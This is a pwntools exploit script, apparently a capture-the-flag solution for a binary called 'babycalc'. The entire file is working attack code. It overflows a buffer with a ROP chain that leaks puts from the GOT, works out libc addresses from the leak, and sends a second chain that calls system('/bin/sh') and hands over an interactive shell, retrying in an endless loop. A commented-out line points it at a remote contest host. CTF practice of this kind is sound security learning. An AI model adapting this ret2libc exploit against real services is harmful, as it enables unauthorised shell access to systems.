from pwn import *

def run():
    p = process('./babycalc')
    # p = remote('tcp.cloud.dasctf.com', 28504)
    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    elf = ELF('./babycalc')

    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    ret = 0x00000000004005b9
    main_addr = 0x400650
    pop_rdi = 0x0000000000400ca3

    payload = b'24' + b'a' * 46 + 12 * p64(ret) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
    payload = payload + 4 * p64(0xaaaa) + p64(0xa111423746352413) + p64(0x0318c77665d48332) + b'c' * 0x1c + p32(0x38)
    p.recv()
    p.send(payload)
    try:
        puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00'))
        print(hex(puts_addr))
    except:
        return 0

    base_addr = puts_addr - 0x06f6a0
    system_addr = base_addr + 0x0453a0
    bin_sh_addr = base_addr + 0x18ce57
    payload = b'24aaaaaa' + p64(ret) * 21 + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
    payload = payload.ljust(208, b'b') + p64(0xa111423746352413) + p64(0x0318c77665d48332) + b'a' * 0x1c + p32(0x38)
    p.send(payload)
    sleep(2)
    p.interactive()


while True:
    run()
